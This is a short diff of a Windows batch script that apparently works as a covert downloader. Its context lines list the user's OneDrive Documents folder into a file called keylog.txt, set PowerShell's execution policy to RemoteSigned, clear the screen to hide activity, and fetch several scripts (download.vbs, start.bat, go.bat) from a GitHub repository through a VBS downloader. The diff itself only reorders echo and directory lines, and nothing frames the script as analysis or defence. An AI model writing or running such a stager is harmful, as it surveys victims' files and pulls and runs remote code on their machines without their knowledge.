@@ -1,8 +1,7 @@
-cd/
 @echo off
+cd/
 cd %USERPROFILE%\OneDrive\Documents\
 dir /s > keylog.txt
-@echo off
 cls
 powershell Set-ExecutionPolicy RemoteSigned
 cls
@@ -19,3 +18,4 @@ WScript c:/script\download.vbs https://github.com/Quentinq32/clouddrive/raw/main
 WScript c:/script\download.vbs https://github.com/Quentinq32/clouddrive/raw/main/download.vbs
 WScript c:/script\download.vbs https://github.com/Quentinq32/clouddrive/raw/main/start.bat
 WScript c:/script\download.vbs https://github.com/Quentinq32/clouddrive/raw/main/go.bat
+@echo off
